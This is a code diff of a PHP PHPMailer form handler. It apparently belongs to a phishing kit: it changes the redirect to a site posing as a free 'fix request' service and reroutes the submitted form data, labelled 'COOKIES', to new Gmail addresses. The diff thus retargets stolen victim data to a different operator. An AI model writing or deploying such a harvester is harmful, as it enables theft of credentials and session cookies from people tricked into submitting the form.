@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://rainbow-cobbler-cd1a02.netlify.app/");
+header("Location: https://nazeer-fix-request-free-a-service.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -34,8 +34,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('rutherfordhenress@gmail.com', 'COOKIES');
-        $mail->addAddress('rutherfordhenress@gmail.com');
+        $mail->addAddress('rutherfordhenress@gmail.com', 'COOKIES');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
        
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'SHOIB';
+        $mail->Subject = 'nazeer';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
